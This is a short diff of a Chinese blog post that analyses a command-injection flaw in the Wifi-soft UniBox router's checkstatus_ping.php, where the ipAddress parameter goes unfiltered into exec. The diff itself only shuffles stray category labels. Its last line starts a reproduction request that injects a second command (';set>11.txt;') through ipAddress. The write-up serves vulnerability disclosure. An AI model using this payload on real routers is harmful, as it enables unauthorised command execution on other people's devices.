@@ -18,6 +18,14 @@ Wifi-soft UniBox controller [路由器](#)产品中存在一个致命[漏洞](ht
 
 # 漏洞分析
 
+深入探索
+
+网安
+
+防病毒程序与恶意软件
+
+数据
+
 直接看 `/network/checkstatus_ping.php` 的业务实现造成[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")的关键部分如下
 
 ```
@@ -38,14 +46,6 @@ function ping($ipAddress) {
 $response = ping($ipAddress);
 ```
 
-深入探索
-
-网络安全
-
-防病毒程序与恶意软件
-
-软件
-
 直接将 `ipAddress` 的值拼接进 `exec` 命令中执行，无任何过滤和校验，因此造成[命令执行](https://mrxn.net/tag/rce)漏洞。
 
 # 漏洞复现
@@ -54,7 +54,7 @@ $response = ping($ipAddress);
 
 > 支持cookie获取参数，注意检测点，别漏
 >
-> 网络监控与管理
+> 网络
 
 ```
 GET /network/checkstatus_ping.php?ipAddress=;set>11.txt; HTTP/1.1
